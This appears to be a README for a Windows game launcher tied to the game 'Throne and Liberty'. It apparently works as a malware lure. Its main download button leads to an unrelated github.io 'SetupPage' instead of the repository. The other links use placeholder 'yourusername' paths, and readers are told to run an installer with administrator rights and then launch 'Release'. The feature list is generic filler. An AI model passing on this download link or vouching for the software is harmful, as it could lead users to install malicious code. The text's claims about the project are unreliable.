# Prime‑Launcher‑Throne‑And‑Liberty

**Author:** MidnightPilotPonder
**Platform:** Windows 10 / 11 (desktop only)
**Domain:** windows‑game‑launcher

---

## 🎮 What is Prime‑Launcher‑Throne‑And‑Liberty?

Prime‑Launcher‑Throne‑And‑Liberty (PLTL) is a **lightweight Windows‑only launcher** designed to keep your PC gaming library tidy and instantly accessible. It lets you:

* Register any installed game or utility with a single click.
* Organize titles into custom categories (e.g., *Adventure*, *Racing*, *utility*).
* Launch games directly from a clean, modern interface without hunting through folders or start‑menu shortcuts.
* Store launch‑time arguments, environment variables, and optional “pre‑launch” scripts.

All of this runs locally, without telemetry, and is fully open‑source.

---

## 🚀 Quick Start

| Action | Button |
|--------|--------|
| **Download the latest installer** | <a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download"></a> |
| **View the documentation** | <a href="https://github.com/yourusername/Prime-Launcher-Throne-And-Liberty/wiki" target="_blank"><img src="https://img.shields.io/badge/Docs-Wiki-lightgrey?style=for-the-badge" alt="Docs"></a> |
| **Report an issue** | <a href="https://github.com/yourusername/Prime-Launcher-Throne-And-Liberty/issues" target="_blank"><img src="https://img.shields.io/badge/Issues-Open%20Now-red?style=for-the-badge" alt="Issues"></a> |

> **Tip:** After installation, run **Release** from the Start menu or the desktop shortcut that the installer creates.

---

## 📂 Feature Overview

| Category | Details |
|----------|---------|
| **Library Management** | Drag‑and‑drop games, edit titles, assign icons, add custom tags. |
| **Launch Profiles** | Save multiple launch configurations per game (e.g., “Windowed”, “VR”). |
| **Utility Integration** | Add companion apps (e.g., voice chat, overlays) to a game’s launch chain. |
| **Theming** | Light and dark UI themes, plus user‑defined colour palettes. |
| **Search & Filters** | Instant fuzzy search, filter by tag, recent play, or category. |
| **Portable Mode** | Copy the entire installation folder to a USB drive and run on any Windows 10/11 PC. |
| **Open‑Source** | Licensed under MIT; contributions welcome. |

---

## 🛠️ Installation & Release

1. Click the **Download** button above; you’ll be taken to the official Release page.
2. Run the installer (requires administrative rights to create start‑menu entries).
3. On first launch, the **Welcome Wizard** will guide you through:
   * Selecting a default library folder.
   * Importing existing game shortcuts (optional).
   * Choosing your preferred UI theme.

> **Note:** PLTL does **not** install any additional runtimes; it works with the native Windows libraries present on 10/11.

---

## 📚 Documentation

- **Getting Started** – step‑by‑step guide for first‑time users.
- **Advanced Configuration** – custom launch scripts, environment variables, and profile chaining.
- **Theming & Custom Icons** – how to personalize the look and feel.
- **FAQ** – answers to the most common questions.

All docs are hosted in the repository’s **Wiki** section (link above).

---

## 🤝 Contributing

We love community input! If you’d like to help:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑thing`).
3. Ensure the code builds with the latest Visual Studio Community edition.
4. Submit a pull request with a clear description of your changes.

Please read the **CONTRIBUTING.md** file for coding standards and the review process.

---

## 📜 License

`Prime-Launcher-Throne-And-Liberty` is released under the **MIT License** – see the `LICENSE` file for full details.

---

## 📢 Stay Connected

- **Twitter / X:** [@MidnightPilot](https://twitter.com/MidnightPilot)
- **Discord:** *Join the “PLTL Community” server for real‑time support and feature polls.*
- **GitHub Discussions:** Use the **Discussions** tab for ideas, showcases, and general chat.

Happy gaming! 🎉

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```